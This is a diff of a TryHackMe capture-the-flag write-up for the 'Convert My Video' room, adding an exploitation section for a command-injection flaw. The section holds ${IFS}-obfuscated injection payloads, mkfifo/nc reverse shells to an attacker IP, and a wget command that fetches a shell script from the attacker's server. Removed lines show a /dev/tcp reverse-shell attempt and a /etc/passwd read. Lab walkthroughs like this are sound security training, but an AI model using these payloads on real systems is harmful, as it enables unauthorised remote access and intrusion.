@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-01T11:11:05.341+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-03T11:34:26.988+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -136,7 +136,7 @@ cat${IFS}/etc/passwd
 ```
 
 
-So the output reveals a **dmv** user.  And it also confirms bash is on the system. Entering multiple words doesn't work as burp cannot process it as a single command. Furthermore URL or base64 encoding doesnt work either. Bash luckily has a syntax for this which can solve the issue.
+So the output reveals a **dmv** user.  And it also confirms bash is on the system. Entering multiple words doesn't work ..... Furthermore URL or base64 encoding doesnt work either. Bash luckily has a syntax for this which can solve the issue.
 
 **Breakdown of Internal Field Separator**
 The ${IFS} is *Internal Field *Separator* aka a syntax in bash allowing to specify a white space character. Since simply writing a command with more than 1 word doesn't work for this payload approach. 
@@ -163,26 +163,72 @@ Let's check for available tools.
 
 So there are plenty tools available. Perhaps it is possible to spawn a reverse shell. Also worth noting that the commands are being executed from **/var/www/html** perhaps a second approach would be writing a script to the directory and executing it.
 
-**Testing for Reverse Shell with nc**
-```
-# initial payload
-bash -i >& /dev/tcp/IP/4444 0>&1
-
-# Inserting IFS
-bash${IFS}-i${IFS}>&${IFS}/dev/tcp/192.168.141.140/4444${IFS}0>&1
-
-# URL-encoding ampersand
-bash${IFS}-i${IFS}>%26${IFS}/dev/tcp/192.168.141.140/4444${IFS}0>%261
-
-Once again, burp cannot process & as a part of the command. It treats it as a new parameter. Thus url-encoding the character is required.
-
-```
-
-This did not yield a connection to the nc listener. 
+----
 
 
------
 ## Exploitation
+
+**Payload for Connection**
+```bash
+;mkfifo${IFS}/dev/shm/f;cat${IFS}/dev/shm/f|/bin/sh${IFS}-i${IFS}2>%261|nc${IFS}192.168.141.140${IFS}4444>/dev/shm/f;
+```
+
+Running this payload establishes an unstable shell in nc however the shell dies right after receiving input. 
+
+### Writing a reverse shell to the server
+
+### Payload 
+```bash
+#!/bin/bash  
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [your ip] 5555 >/tmp/f
+```
+
+**Breakdown of the Payload**
+1. Remove the file 'f' if it exists to avoid conflicts. 
+2. Create the named pipe in the /tmp folder 
+3. Display the content of the named pipe
+4. Pipe the output of the named pipe to the system shell and redirect stderr to stdout 
+5. Pipe the output of that into the listener and save it to the named pipe file ensuring that target machine can receive malicious commands 
+
+
+```bash
+echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > shell.sh
+```
+
+The classic approach did not work. Perhaps creating a named pipe to get a reverse shell will work. Based off of the payload for testing a connection with a named pipe earlier it seems like the ideal approach.
+
+**Uploading shell.sh to the server**
+```bash
+;wget${IFS}http://192.168.141.140:8888/shell.sh;
+```
+
+![](/img/user/Attachments/rev-shell-uploaded.png)
+
+So, the shell is uploaded via the python http server and burp confirms its a success. So, the rev shell is uploaded.
+
+**Confirming the payload is inside the script**
+
+![](/img/user/Attachments/confirmed-shell-content.png)
+
+
+```bash
+;cat${IFS}shell.sh;
+```
+
+For good sake, the content of the payload is confirmed. 
+
+**Gaining foothold with nc**
+
+![](/img/user/Attachments/foothold.png)
+
+```bash
+sh${IFS}shell.sh
+```
+
+So running above command in burp with nc listening will execute a rev shell. Time to do some post exploit.
+
+
+
 
 
 
